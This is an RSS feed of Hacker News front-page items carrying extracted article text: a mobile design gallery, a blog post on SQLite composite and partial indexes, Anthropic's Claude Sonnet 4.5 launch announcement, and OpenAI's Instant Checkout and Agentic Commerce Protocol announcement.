<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Hacker News: Front Page</title><link>https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml</link><description>Hacker News RSS</description><atom:link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Tue, 30 Sep 2025 09:38:09 +0000</lastBuildDate><item><title>Loadmo.re: design inspiration for unconventional web</title><link>https://loadmo.re</link><description>&lt;doc fingerprint="3ff13a7998ceec39"&gt;
  &lt;main&gt;
    &lt;p&gt;loadmo.re is a mobile websites gallery showcasing the best design inspiration for unconventional web. To keep up with updates, follow us on Instagram.&lt;/p&gt;
    &lt;p&gt;From its earliest days, digital design practice has been focused on creating interfaces for computers. Screen-based interactions are now mainly happening through smartphones and mobile-first experiences have become the norm. However, as digital designers, we still use computers as our main working tool and continue to browse desktop websites when searching for references. This process makes it difficult to acknowledge a shift and embrace the fact that the Internet isn’t happening where it used to.&lt;/p&gt;
    &lt;p&gt;loadmo.re showcases distinctive websites for smartphones. Through this archive, we hope to encourage digital designers to take full advantage of the mobile phone’s interface and functionality. We hope that this platform will generate conversation on mobile-first design within our digital communities.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45415207</guid><pubDate>Mon, 29 Sep 2025 15:42:46 +0000</pubDate></item><item><title>Subtleties of SQLite Indexes</title><link>https://emschwartz.me/subtleties-of-sqlite-indexes/</link><description>&lt;doc fingerprint="211c43577cb25887"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Subtleties of SQLite Indexes&lt;/head&gt;
    &lt;p&gt;In the last 6 months, Scour has gone from ingesting 330,000 pieces of content per month to over 1.4 million this month. The massive increase in the number of items slowed down the ranking for users' feeds and sent me looking for ways to speed it up again.&lt;/p&gt;
    &lt;p&gt;After spending too many hours trying in vain to squeeze more performance out of my queries and indexes, I dug into how SQLite's query planner uses indexes, learned some of the subtleties that explained why my initial tweaks weren't working, and sped up one of my main queries by ~35%.&lt;/p&gt;
    &lt;head rend="h2"&gt;Scour's &lt;code&gt;items&lt;/code&gt; table&lt;/head&gt;
    &lt;p&gt;Scour is a personalized content feed that finds articles, blog posts, etc related to users' interests. For better and for worse, Scour does its ranking on the fly whenever users load their feeds page. Initially, this took 100 milliseconds or less, thanks to binary vector embeddings and the fact that it's using SQLite so there is no network latency to load data.&lt;/p&gt;
    &lt;p&gt;The most important table in Scour's database is the &lt;code&gt;items&lt;/code&gt; table. It includes an ID, URL, title, language, publish date (stored as a Unix timestamp), and a text quality rating.&lt;/p&gt;
    &lt;p&gt;Scour's main ranking query filters items based on when they were published, whether they are in a language the user understands, and whether they are above a certain quality threshold.&lt;/p&gt;
    &lt;p&gt;The question is: what indexes do we need to speed up this query?&lt;/p&gt;
    &lt;head rend="h2"&gt;Don't bother with multiple single-column indexes&lt;/head&gt;
    &lt;p&gt;When I first set up Scour's database, I put a bunch of indexes on the &lt;code&gt;items&lt;/code&gt; table without really thinking about whether they would help. For example, I had separate indexes on the published date, the language, and the quality rating. Useless.&lt;/p&gt;
    &lt;p&gt;It's more important to have one or a small handful of good composite indexes on multiple columns than to have separate indexes on each column.&lt;/p&gt;
    &lt;p&gt;In most cases, the query planner won't bother merging the results from two indexes on the same table. Instead, it will use one of the indexes and then scan all of the rows that match the filter for that index's column.&lt;/p&gt;
    &lt;p&gt;It's worth being careful to only add indexes that will be used by real queries. Having additional indexes on each column won't hurt read performance. However, each index takes up storage space and more indexes will slow down writes, because all of the indexes need to be updated when new rows are inserted into the table.&lt;/p&gt;
    &lt;p&gt;If we're going to have an index on multiple columns, which columns should we include and what order should we put them in?&lt;/p&gt;
    &lt;head rend="h2"&gt;Index column order matters&lt;/head&gt;
    &lt;p&gt;The order of conditions in a query doesn't matter, but the order of columns in an index very much does.&lt;/p&gt;
    &lt;p&gt;Columns that come earlier in the index should be more "selective": they should help the database narrow the results set as much as possible.&lt;/p&gt;
    &lt;p&gt;In Scour's case, the most selective column is the publish date, followed by the quality rating, followed by the language. I put an index on those columns in that order:&lt;/p&gt;
    &lt;code&gt;CREATE INDEX idx_items_published_quality_lang
ON items(published, low_quality_probability, lang);
&lt;/code&gt;
    &lt;p&gt;...and found that SQLite was only using one of the columns. Running this query:&lt;/p&gt;
    &lt;code&gt;EXPLAIN QUERY PLAN
SELECT id, low_quality_probability
FROM items
WHERE published BETWEEN $1 AND $2
AND low_quality_probability &amp;lt;= $3
AND lang IN (SELECT lang FROM user_languages WHERE user_id = $4)
&lt;/code&gt;
    &lt;p&gt;Produced this query plan:&lt;/p&gt;
    &lt;code&gt;QUERY PLAN
   |--SEARCH items USING COVERING INDEX idx_items_published_quality_lang (published&amp;gt;? AND published&amp;lt;?)
   `--CORRELATED LIST SUBQUERY 1
      `--SCAN user_languages USING COVERING INDEX sqlite_autoindex_user_languages_1
&lt;/code&gt;
    &lt;p&gt;It was using the right index but only filtering by &lt;code&gt;published&lt;/code&gt; (note the part of the plan that says &lt;code&gt;(published&amp;gt;? AND published&amp;lt;?)&lt;/code&gt;). Puzzling.&lt;/p&gt;
    &lt;head rend="h2"&gt;Left to right, no skipping, stops at the first range&lt;/head&gt;
    &lt;p&gt;My aha moment came while watching Aaron Francis' High Performance SQLite course. He said the main rule for SQLite indexes is: "Left to right, no skipping, stops at the first range." (This is a much clearer statement of the implications of the Where Clause Analysis buried in the Query Optimizer Overview section of the official docs.)&lt;/p&gt;
    &lt;p&gt;This rule means that the query planner will:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Consider columns from left to right. In my case, the first column in the index is &lt;code&gt;published&lt;/code&gt;. SQLite will search for rows where the&lt;code&gt;published&lt;/code&gt;field is in the correct range before considering the other columns.&lt;/item&gt;
      &lt;item&gt;No skipping means that SQLite cannot use only the 1st and 3rd column in an index. As soon as it reaches a column in the index that does not appear in the query, it must do a scan through all of the rows matching the 1st column.&lt;/item&gt;
      &lt;item&gt;Stops at the first range. That was the key I was missing. Filtering by the &lt;code&gt;published&lt;/code&gt;timestamp first would indeed narrow down the results more than filtering first by one of the other columns. However, the fact that the query uses a range condition on the&lt;code&gt;published&lt;/code&gt;column (&lt;code&gt;WHERE published BETWEEN $1 AND $2&lt;/code&gt;) means that SQLite can only scan all of the rows in that&lt;code&gt;published&lt;/code&gt;range, rather than fully utilizing the other columns in the index to hone in on the correct rows.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;My query includes two ranges (&lt;code&gt;published BETWEEN $1 AND $2 AND low_quality_probability &amp;lt;= $3&lt;/code&gt;), so the "stops at the first range" rule explains why I was only seeing the query planner use one of those columns. This rule does, however, suggest that I can create an index that will allow SQLite to filter by the one non-range condition (&lt;code&gt;lang IN (SELECT lang FROM user_languages WHERE user_id = $4)&lt;/code&gt;) before using one of the ranges:&lt;/p&gt;
    &lt;code&gt;CREATE INDEX idx_lang_published_quality
ON items(lang, published, low_quality_probability);
&lt;/code&gt;
    &lt;p&gt;The query plan shows that it can use both the &lt;code&gt;lang&lt;/code&gt; and &lt;code&gt;published&lt;/code&gt; columns (note the part that reads &lt;code&gt;lang=? AND published&amp;gt;? AND published&amp;lt;?&lt;/code&gt;):&lt;/p&gt;
    &lt;code&gt;QUERY PLAN
|--SEARCH items USING COVERING INDEX idx_items_lang_published_quality (lang=? AND published&amp;gt;? AND published&amp;lt;?)
`--LIST SUBQUERY 1
   `--SEARCH user_languages USING COVERING INDEX sqlite_autoindex_user_languages_1 (user_id=?)
&lt;/code&gt;
    &lt;p&gt;Now we're using two out of the three columns to quickly filter the rows. Can we use all three? (Remember, the query planner won't be able to use multiple range queries on the same index, so we'll need something else.)&lt;/p&gt;
    &lt;head rend="h2"&gt;&lt;code&gt;WHERE&lt;/code&gt; conditions for partial indexes must exactly match&lt;/head&gt;
    &lt;p&gt;SQLite has a nice feature called Partial Indexes that allows you to define an index that only applies to a subset of the rows matching some conditions.&lt;/p&gt;
    &lt;p&gt;In Scour's case, we only really want items where the &lt;code&gt;low_quality_probability&lt;/code&gt; is less than or equal to 90%. The model I'm using to judge quality isn't that great, so I only trust it to filter out items if it's really sure they're low quality.&lt;/p&gt;
    &lt;p&gt;This means I can create an index like this:&lt;/p&gt;
    &lt;code&gt;CREATE INDEX idx_lang_published_quality_filtered
ON items(lang, published, low_quality_probability)
WHERE low_quality_probability &amp;lt;= .9;
&lt;/code&gt;
    &lt;p&gt;And then update the query to use the same &lt;code&gt;WHERE&lt;/code&gt; condition:&lt;/p&gt;
    &lt;code&gt;EXPLAIN QUERY PLAN
SELECT id, low_quality_probability
FROM items
WHERE low_quality_probability &amp;lt;= 0.9
AND published BETWEEN $1 AND $2
AND low_quality_probability &amp;lt;= $3
AND lang IN (SELECT lang FROM user_languages WHERE id = $4)
&lt;/code&gt;
    &lt;p&gt;And it should use our new partial index... right? Wrong. This query is still using the previous index.&lt;/p&gt;
    &lt;code&gt;QUERY PLAN
|--SEARCH items USING COVERING INDEX idx_items_lang_published_quality (lang=? AND published&amp;gt;? AND published&amp;lt;?)
`--LIST SUBQUERY 1
   `--SEARCH user_languages USING COVERING INDEX sqlite_autoindex_user_languages_1 (user_id=?)
&lt;/code&gt;
    &lt;p&gt;There's a subtle mistake in the relationship between our index and our query. Can you spot it?&lt;/p&gt;
    &lt;p&gt;Our index contains the condition &lt;code&gt;WHERE low_quality_probability &amp;lt;= .9&lt;/code&gt; but our query says &lt;code&gt;WHERE low_quality_probability &amp;lt;= 0.9&lt;/code&gt;. These are mathematically equivalent but they are not exactly the same.&lt;/p&gt;
    &lt;p&gt;SQLite's query planner requires the conditions to match exactly in order for it to use a partial index. Relatedly, a condition of &lt;code&gt;&amp;lt;= 0.95&lt;/code&gt; or even &lt;code&gt;&amp;lt;= 0.5 + 0.4&lt;/code&gt; in the query would also not utilize the partial index.&lt;/p&gt;
    &lt;p&gt;If we rewrite our query to use the exact same condition of &lt;code&gt;&amp;lt;= .9&lt;/code&gt;, we get the query plan:&lt;/p&gt;
    &lt;code&gt;QUERY PLAN
|--SEARCH items USING COVERING INDEX idx_lang_published_quality_filtered (ANY(lang) AND published&amp;gt;? AND published&amp;lt;?)
`--CORRELATED LIST SUBQUERY 1
   `--SCAN user_languages USING COVERING INDEX sqlite_autoindex_user_languages_1
&lt;/code&gt;
    &lt;p&gt;Now, we're starting with the items whose &lt;code&gt;low_quality_probability &amp;lt;= .9&lt;/code&gt;, then using the index to find the items in the desired language(s), and lastly narrowing down the results to the items that were published in the correct time range.&lt;/p&gt;
    &lt;head rend="h2"&gt;Better query plans find matching rows faster&lt;/head&gt;
    &lt;p&gt;As mentioned in the intro, these changes to the indexes and one of Scour's main ranking queries yielded a ~35% speedup.&lt;/p&gt;
    &lt;p&gt;Enabling the query planner to make better use of the indexes makes it so that SQLite doesn't need to scan as many rows to find the ones that match the query conditions.&lt;/p&gt;
    &lt;p&gt;Concretely, in Scour's case, filtering by language removes about 30% of items for most users and filtering out low quality content removes a further 50%. Together, these changes reduce the number of rows scanned by around 66%.&lt;/p&gt;
    &lt;p&gt;Sadly, however, a 66% reduction in the number of rows scanned does not directly translate to a 66% speedup in the query. If we're doing more than counting rows, the work to load the data out of the database and process it can be more resource intensive than scanning rows to match conditions. (The optimized queries and indexes still load the same number of rows as before, they just identifying the desired rows faster.) Nevertheless, a 35% speedup is a noticeable improvement.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;It's worth digging into how your database's query planner uses indexes to help get to the bottom of performance issues.&lt;/p&gt;
    &lt;p&gt;If you're working with SQLite, remember that:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;A smaller number of composite indexes are more useful that multiple single-column indexes. It's better to have an index over &lt;code&gt;(lang, published, low_quality_probability)&lt;/code&gt;than separate indexes for each.&lt;/item&gt;
      &lt;item&gt;The query planner uses the rule "Left to right, no skipping, stops at the first range". If a query has multiple range conditions, it may be worth putting the columns that use strict equality first in the index, like we did above with &lt;code&gt;lang&lt;/code&gt;coming before&lt;code&gt;published&lt;/code&gt;or&lt;code&gt;low_quality_probability&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;Conditions used in &lt;code&gt;WHERE&lt;/code&gt;clauses for partial indexes must exactly match the condition used in the corresponding query.&lt;code&gt;&amp;lt;= 0.9&lt;/code&gt;is not exactly the same as&lt;code&gt;&amp;lt;= .9&lt;/code&gt;, even if they are mathematically equivalent.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Thanks to Aaron Francis for putting together the High Performance SQLite course! (I have no personal or financial relationship to him, but I appreciate his course unblocking me and helping me speed up Scour's ranking.) Thank you also to Adam Gluck and Alex Kesling for feedback on this post.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45415332</guid><pubDate>Mon, 29 Sep 2025 15:54:42 +0000</pubDate></item><item><title>Claude Sonnet 4.5</title><link>https://www.anthropic.com/news/claude-sonnet-4-5</link><description>&lt;doc fingerprint="1f7d0fde2c1bca6e"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Introducing Claude Sonnet 4.5&lt;/head&gt;
    &lt;p&gt;Claude Sonnet 4.5 is the best coding model in the world. It's the strongest model for building complex agents. It’s the best model at using computers. And it shows substantial gains in reasoning and math.&lt;/p&gt;
    &lt;p&gt;Code is everywhere. It runs every application, spreadsheet, and software tool you use. Being able to use those tools and reason through hard problems is how modern work gets done.&lt;/p&gt;
    &lt;p&gt;Claude Sonnet 4.5 makes this possible. We're releasing it along with a set of major upgrades to our products. In Claude Code, we've added checkpoints—one of our most requested features—that save your progress and allow you to roll back instantly to a previous state. We've refreshed the terminal interface and shipped a native VS Code extension. We've added a new context editing feature and memory tool to the Claude API that lets agents run even longer and handle even greater complexity. In the Claude apps, we've brought code execution and file creation (spreadsheets, slides, and documents) directly into the conversation. And we've made the Claude for Chrome extension available to Max users who joined the waitlist last month.&lt;/p&gt;
    &lt;p&gt;We're also giving developers the building blocks we use ourselves to make Claude Code. We're calling this the Claude Agent SDK. The infrastructure that powers our frontier products—and allows them to reach their full potential—is now yours to build with.&lt;/p&gt;
    &lt;p&gt;This is the most aligned frontier model we’ve ever released, showing large improvements across several areas of alignment compared to previous Claude models.&lt;/p&gt;
    &lt;p&gt;Claude Sonnet 4.5 is available everywhere today. If you’re a developer, simply use &lt;code&gt;claude-sonnet-4-5&lt;/code&gt; via the Claude API. Pricing remains the same as Claude Sonnet 4, at $3/$15 per million tokens.&lt;/p&gt;
    &lt;head rend="h2"&gt;Frontier intelligence&lt;/head&gt;
    &lt;p&gt;Claude Sonnet 4.5 is state-of-the-art on the SWE-bench Verified evaluation, which measures real-world software coding abilities. Practically speaking, we’ve observed it maintaining focus for more than 30 hours on complex, multi-step tasks.&lt;/p&gt;
    &lt;p&gt;Claude Sonnet 4.5 represents a significant leap forward on computer use. On OSWorld, a benchmark that tests AI models on real-world computer tasks, Sonnet 4.5 now leads at 61.4%. Just four months ago, Sonnet 4 held the lead at 42.2%. Our Claude for Chrome extension puts these upgraded capabilities to use. In the demo below, we show Claude working directly in a browser, navigating sites, filling spreadsheets, and completing tasks.&lt;/p&gt;
    &lt;p&gt;The model also shows improved capabilities on a broad range of evaluations including reasoning and math:&lt;/p&gt;
    &lt;p&gt;Experts in finance, law, medicine, and STEM found Sonnet 4.5 shows dramatically better domain-specific knowledge and reasoning compared to older models, including Opus 4.1.&lt;/p&gt;
    &lt;p&gt;The model’s capabilities are also reflected in the experiences of early customers:&lt;/p&gt;
    &lt;quote&gt;We're seeing state-of-the-art coding performance from Claude Sonnet 4.5, with significant improvements on longer horizon tasks. It reinforces why many developers using Cursor choose Claude for solving their most complex problems.&lt;/quote&gt;
    &lt;quote&gt;Claude Sonnet 4.5 amplifies GitHub Copilot's core strengths. Our initial evals show significant improvements in multi-step reasoning and code comprehension—enabling Copilot's agentic experiences to handle complex, codebase-spanning tasks better.&lt;/quote&gt;
    &lt;quote&gt;Claude Sonnet 4.5 is excellent at software development tasks, learning our codebase patterns to deliver precise implementations. It handles everything from debugging to architecture with deep contextual understanding, transforming our development velocity.&lt;/quote&gt;
    &lt;quote&gt;Claude Sonnet 4.5 reduced average vulnerability intake time for our Hai security agents by 44% while improving accuracy by 25%, helping us reduce risk for businesses with confidence.&lt;/quote&gt;
    &lt;quote&gt;Claude Sonnet 4.5 is state of the art on the most complex litigation tasks. For example, analyzing full briefing cycles and conducting research to synthesize excellent first drafts of an opinion for judges, or interrogating entire litigation records to create detailed summary judgment analysis.&lt;/quote&gt;
    &lt;quote&gt;Claude Sonnet 4.5's edit capabilities are exceptional — we went from 9% error rate on Sonnet 4 to 0% on our internal code editing benchmark. Higher tool success at lower cost is a major leap for agentic coding. Claude Sonnet 4.5 balances creativity and control perfectly.&lt;/quote&gt;
    &lt;quote&gt;Claude Sonnet 4.5 delivers impressive gains on our most complex, long-context tasks—from engineering in our codebase to in-product features and research. It's noticeably more intelligent and a big leap forward, helping us push what 240M+ users can design with Canva.&lt;/quote&gt;
    &lt;quote&gt;Claude Sonnet 4.5 has noticeably improved Figma Make in early testing, making it easier to prompt and iterate. Teams can explore and validate their ideas with more functional prototypes and smoother interactions, while still getting the design quality Figma is known for.&lt;/quote&gt;
    &lt;quote&gt;Sonnet 4.5 represents a new generation of coding models. It's surprisingly efficient at maximizing actions per context window through parallel tool execution, for example running multiple bash commands at once.&lt;/quote&gt;
    &lt;quote&gt;For Devin, Claude Sonnet 4.5 increased planning performance by 18% and end-to-end eval scores by 12%—the biggest jump we've seen since the release of Claude Sonnet 3.6. It excels at testing its own code, enabling Devin to run longer, handle harder tasks, and deliver production-ready code.&lt;/quote&gt;
    &lt;quote&gt;Claude Sonnet 4.5 shows strong promise for red teaming, generating creative attack scenarios that accelerate how we study attacker tradecraft. These insights strengthen our defenses across endpoints, identity, cloud, data, SaaS, and AI workloads.&lt;/quote&gt;
    &lt;quote&gt;Claude Sonnet 4.5 resets our expectations—it handles 30+ hours of autonomous coding, freeing our engineers to tackle months of complex architectural work in dramatically less time while maintaining coherence across massive codebases.&lt;/quote&gt;
    &lt;quote&gt;For complex financial analysis—risk, structured products, portfolio screening—Claude Sonnet 4.5 with thinking delivers investment-grade insights that require less human review. When depth matters more than speed, it's a meaningful step forward for institutional finance.&lt;/quote&gt;
    &lt;head rend="h2"&gt;Our most aligned model yet&lt;/head&gt;
    &lt;p&gt;As well as being our most capable model, Claude Sonnet 4.5 is our most aligned frontier model yet. Claude’s improved capabilities and our extensive safety training have allowed us to substantially improve the model’s behavior, reducing concerning behaviors like sycophancy, deception, power-seeking, and the tendency to encourage delusional thinking. For the model’s agentic and computer use capabilities, we’ve also made considerable progress on defending against prompt injection attacks, one of the most serious risks for users of these capabilities.&lt;/p&gt;
    &lt;p&gt;You can read a detailed set of safety and alignment evaluations, which for the first time includes tests using techniques from mechanistic interpretability, in the Claude Sonnet 4.5 system card.&lt;/p&gt;
    &lt;p&gt;Claude Sonnet 4.5 is being released under our AI Safety Level 3 (ASL-3) protections, as per our framework that matches model capabilities with appropriate safeguards. These safeguards include filters called classifiers that aim to detect potentially dangerous inputs and outputs—in particular those related to chemical, biological, radiological, and nuclear (CBRN) weapons.&lt;/p&gt;
    &lt;p&gt;These classifiers might sometimes inadvertently flag normal content. We’ve made it easy for users to continue any interrupted conversations with Sonnet 4, a model that poses a lower CBRN risk. We've already made significant progress in reducing these false positives, reducing them by a factor of ten since we originally described them, and a factor of two since Claude Opus 4 was released in May. We’re continuing to make progress in making the classifiers more discerning1.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Claude Agent SDK&lt;/head&gt;
    &lt;p&gt;We've spent more than six months shipping updates to Claude Code, so we know what it takes to build and design AI agents. We've solved hard problems: how agents should manage memory across long-running tasks, how to handle permission systems that balance autonomy with user control, and how to coordinate subagents working toward a shared goal.&lt;/p&gt;
    &lt;p&gt;Now we’re making all of this available to you. The Claude Agent SDK is the same infrastructure that powers Claude Code, but it shows impressive benefits for a very wide variety of tasks, not just coding. As of today, you can use it to build your own agents.&lt;/p&gt;
    &lt;p&gt;We built Claude Code because the tool we wanted didn’t exist yet. The Agent SDK gives you the same foundation to build something just as capable for whatever problem you're solving.&lt;/p&gt;
    &lt;head rend="h2"&gt;Bonus research preview&lt;/head&gt;
    &lt;p&gt;We’re releasing a temporary research preview alongside Claude Sonnet 4.5, called "Imagine with Claude".&lt;/p&gt;
    &lt;p&gt;In this experiment, Claude generates software on the fly. No functionality is predetermined; no code is prewritten. What you see is Claude creating in real time, responding and adapting to your requests as you interact.&lt;/p&gt;
    &lt;p&gt;It's a fun demonstration showing what Claude Sonnet 4.5 can do—a way to see what's possible when you combine a capable model with the right infrastructure.&lt;/p&gt;
    &lt;p&gt;"Imagine with Claude" is available to Max subscribers for the next five days. We encourage you to try it out on claude.ai/imagine.&lt;/p&gt;
    &lt;head rend="h2"&gt;Further information&lt;/head&gt;
    &lt;p&gt;We recommend upgrading to Claude Sonnet 4.5 for all uses. Whether you’re using Claude through our apps, our API, or Claude Code, Sonnet 4.5 is a drop-in replacement that provides much improved performance for the same price. Claude Code updates are available to all users. Claude Developer Platform updates, including the Claude Agent SDK, are available to all developers. Code execution and file creation are available on all paid plans in the Claude apps.&lt;/p&gt;
    &lt;p&gt;For complete technical details and evaluation results, see our system card, model page, and documentation. For more information, explore our engineering posts and research post on cybersecurity.&lt;/p&gt;
    &lt;head rend="h4"&gt;Footnotes&lt;/head&gt;
    &lt;p&gt;1: Customers in the cybersecurity and biological research industries can work with their account teams to join our allowlist in the meantime.&lt;lb/&gt;Methodology&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;SWE-bench Verified: All Claude results were reported using a simple scaffold with two tools—bash and file editing via string replacements. We report 77.2%, which was averaged over 10 trials, no test-time compute, and 200K thinking budget on the full 500-problem SWE-bench Verified dataset.&lt;list rend="ul"&gt;&lt;item&gt;The score reported uses a minor prompt addition: "You should use tools as much as possible, ideally more than 100 times. You should also implement your own tests first before attempting the problem."&lt;/item&gt;&lt;item&gt;A 1M context configuration achieves 78.2%, but we report the 200K result as our primary score as the 1M configuration was implicated in our recent inference issues.&lt;/item&gt;&lt;item&gt;For our "high compute" numbers we adopt additional complexity and parallel test-time compute as follows:&lt;list rend="ul"&gt;&lt;item&gt;We sample multiple parallel attempts.&lt;/item&gt;&lt;item&gt;We discard patches that break the visible regression tests in the repository, similar to the rejection sampling approach adopted by Agentless (Xia et al. 2024); note no hidden test information is used.&lt;/item&gt;&lt;item&gt;We then use an internal scoring model to select the best candidate from the remaining attempts.&lt;/item&gt;&lt;item&gt;This results in a score of 82.0% for Sonnet 4.5.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Terminal-Bench: All scores reported use the default agent framework (Terminus 2), with XML parser, averaging multiple runs during different days to smooth the eval sensitivity to inference infrastructure.&lt;/item&gt;
      &lt;item&gt;τ2-bench: Scores were achieved using extended thinking with tool use and a prompt addendum to the Airline and Telecom Agent Policy instructing Claude to better target its known failure modes when using the vanilla prompt. A prompt addendum was also added to the Telecom User prompt to avoid failure modes from the user ending the interaction incorrectly.&lt;/item&gt;
      &lt;item&gt;AIME: Sonnet 4.5 score reported using sampling at temperature 1.0. The model used 64K reasoning tokens for the Python configuration.&lt;/item&gt;
      &lt;item&gt;OSWorld: All scores reported use the official OSWorld-Verified framework with 100 max steps, averaged across 4 runs.&lt;/item&gt;
      &lt;item&gt;MMMLU: All scores reported are the average of 5 runs over 14 non-English languages with extended thinking (up to 128K).&lt;/item&gt;
      &lt;item&gt;Finance Agent: All scores reported were run and published by Vals AI on their public leaderboard. All Claude model results reported are with extended thinking (up to 64K) and Sonnet 4.5 is reported with interleaved thinking on.&lt;/item&gt;
      &lt;item&gt;All OpenAI scores reported from their GPT-5 post, GPT-5 for developers post, GPT-5 system card (SWE-bench Verified reported using n=500), Terminal Bench leaderboard (using Terminus 2), and public Vals AI leaderboard. All Gemini scores reported from their model web page, Terminal Bench leaderboard (using Terminus 1), and public Vals AI leaderboard.&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45415962</guid><pubDate>Mon, 29 Sep 2025 16:52:59 +0000</pubDate></item><item><title>Instant Checkout and the Agentic Commerce Protocol</title><link>https://openai.com/index/buy-it-in-chatgpt/</link><description>&lt;doc fingerprint="f98eca781c87c5ec"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Buy it in ChatGPT: Instant Checkout and the Agentic Commerce Protocol&lt;/head&gt;
    &lt;p&gt;We’re taking first steps toward agentic commerce in ChatGPT with new ways for people, AI agents, and businesses to shop together.&lt;/p&gt;
    &lt;p&gt;More than 700 million people turn to ChatGPT each week for help with everyday tasks, including finding products they love. Starting today, we’re taking the first steps toward ChatGPT helping people buy them too—beginning with Instant Checkout, powered by the Agentic Commerce Protocol, built with Stripe.&lt;/p&gt;
    &lt;p&gt;U.S. ChatGPT Plus, Pro, and Free users can now buy directly from U.S. Etsy sellers right in chat, with over a million Shopify merchants, like Glossier, SKIMS, Spanx and Vuori, coming soon. Today, Instant Checkout supports single-item purchases. Next, we’ll add multi-item carts and expand merchants and regions.&lt;/p&gt;
    &lt;p&gt;We’re also open-sourcing(opens in a new window) the technology that powers Instant Checkout, the Agentic Commerce Protocol, so that more merchants and developers can begin building their integrations. The Agentic Commerce Protocol is an open standard for AI commerce that lets AI agents, people, and businesses work together to complete purchases. We co-developed it with Stripe(opens in a new window) and leading merchant partners to be powerful, secure, and easy to adopt.&lt;/p&gt;
    &lt;p&gt;This marks the next step in agentic commerce, where ChatGPT doesn’t just help you find what to buy, it also helps you buy it. For shoppers, it’s seamless: go from chat to checkout in just a few taps. For sellers, it’s a new way to reach hundreds of millions of people while keeping full control of their payments, systems, and customer relationships.&lt;/p&gt;
    &lt;p&gt;We’re making this protocol and our documentation(opens in a new window) available today so interested merchants and developers can begin building integrations. When you’re ready to make your products available for purchase through ChatGPT, you can apply here(opens in a new window).&lt;/p&gt;
    &lt;p&gt;When someone asks a shopping question—“best running shoes under $100” or “gifts for a ceramics lover” — ChatGPT shows the most relevant products from across the web. Product results are organic and unsponsored, ranked purely on relevance to the user.&lt;/p&gt;
    &lt;p&gt;If a product supports Instant Checkout, users can tap “Buy,” confirm their order, shipping, and payment details, and complete the purchase without ever leaving the chat. Existing ChatGPT subscribers can pay with their card on file, or other card and express payment options.&lt;/p&gt;
    &lt;p&gt;Orders, payments, and fulfillment are handled by the merchant using their existing systems. ChatGPT simply acts as the user’s AI agent—securely passing information between user and merchant, just like a digital personal shopper would.&lt;/p&gt;
    &lt;p&gt;Merchants pay a small fee on completed purchases, but the service is free for users, doesn’t affect their prices, and doesn’t influence ChatGPT’s product results. Instant Checkout items are not preferred in product results. When ranking multiple merchants that sell the same product, ChatGPT considers factors like availability, price, quality, whether a merchant is the primary seller, and whether Instant Checkout is enabled, to optimize the user experience.&lt;/p&gt;
    &lt;p&gt;At the core of this experience is the Agentic Commerce Protocol(opens in a new window) which provides the language that lets AI agents and businesses work together to complete a purchase for a user.&lt;/p&gt;
    &lt;p&gt;We built the Agentic Commerce Protocol with Stripe and leading merchants to:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Work across platforms, payment processors, and business types.&lt;/item&gt;
      &lt;item&gt;Integrate quickly without changing their backend systems.&lt;/item&gt;
      &lt;item&gt;Keep merchants in control of the customer relationship as the merchant of record across the purchase journey–from fulfillment and returns to support and communication.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;When someone places an order, ChatGPT sends the necessary details to the merchant’s backend using Agentic Commerce Protocol. The merchant accepts or declines the order, processes the payment via their existing provider, and handles fulfillment and customer support exactly as they do today.&lt;/p&gt;
    &lt;p&gt;If a merchant already processes payments with Stripe(opens in a new window), they can enable agentic payments in as little as one line of code. If they use another payment processor, they can still participate in Instant Checkout and accept agentic payments either by using Stripe’s new Shared Payment Token API(opens in a new window) or adopting the Delegated Payments Spec in the Agentic Commerce Protocol—all without changing their existing payment processor.&lt;/p&gt;
    &lt;p&gt;We believe agentic commerce should be built for trust. In this early stage of the AI commerce future:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Users stay in control — they explicitly confirm each step before any action is taken.&lt;/item&gt;
      &lt;item&gt;Payment is secure — encrypted payment tokens are only authorized for specific amounts and specific merchants with the user’s permission.&lt;/item&gt;
      &lt;item&gt;Data sharing is minimal — only the information required to complete the order is shared with the merchant, with the user’s permission.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Partner perspectives&lt;/head&gt;
    &lt;quote&gt;"Stripe is building the economic infrastructure for AI. That means re-architecting today’s commerce systems and creating new AI-powered experiences for billions of people. We’re proud to power Instant Checkout in ChatGPT and co-develop the Agentic Commerce Protocol to help businesses and AI platforms build the future of commerce."&lt;/quote&gt;
    &lt;p&gt;This launch is just the beginning. As AI becomes a key interface for how people discover, decide, and buy, the Agentic Commerce Protocol provides a foundation that connects people and businesses for the next era of commerce.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
